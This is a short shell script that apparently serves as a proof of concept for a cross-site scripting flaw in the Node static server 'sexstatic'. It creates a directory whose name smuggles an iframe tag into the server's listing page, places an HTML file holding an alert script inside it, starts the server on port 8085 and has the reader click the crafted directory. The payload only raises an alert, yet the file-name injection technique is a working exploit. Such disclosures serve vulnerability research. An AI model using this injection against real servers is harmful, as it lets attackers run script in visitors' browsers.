MAL="Mal.html"
DIR="\"><iframe src='$MAL'>"

# Setup
mkdir "$DIR"
echo "<!DOCTYPE html><html><body><script>alert('Exploited!')</script></body></html>" > "$DIR/$MAL"

./node_modules/sexstatic/lib/sexstatic.js -p 8085
# Goto http://locahost:8085/ & Click in "$DIR"

# Cleanup
rm -rf "$DIR"
